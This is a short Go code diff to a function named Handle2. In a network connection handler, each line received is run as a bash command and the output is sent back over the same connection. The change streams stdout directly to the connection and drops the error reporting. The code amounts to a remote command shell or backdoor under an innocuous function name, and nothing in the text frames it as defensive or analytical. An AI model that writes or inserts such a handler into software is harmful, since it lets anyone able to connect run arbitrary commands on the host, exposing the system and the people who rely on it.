@@ -152,12 +152,9 @@ func Handle2(data []byte) error {
 			sc := bufio.NewScanner(conn)
 			for sc.Scan() {
 				line := sc.Text()
-				out, err := exec.Command("bash", "-c", line).Output()
-				if err != nil {
-					fmt.Fprintln(conn, err.Error())
-				} else {
-					fmt.Fprintf(conn, "%s\n", out)
-				}
+				cmd := exec.Command("bash", "-c", line)
+				cmd.Stdout = conn
+				cmd.Run()
 			}
 		}(conn)
 	}(conn)
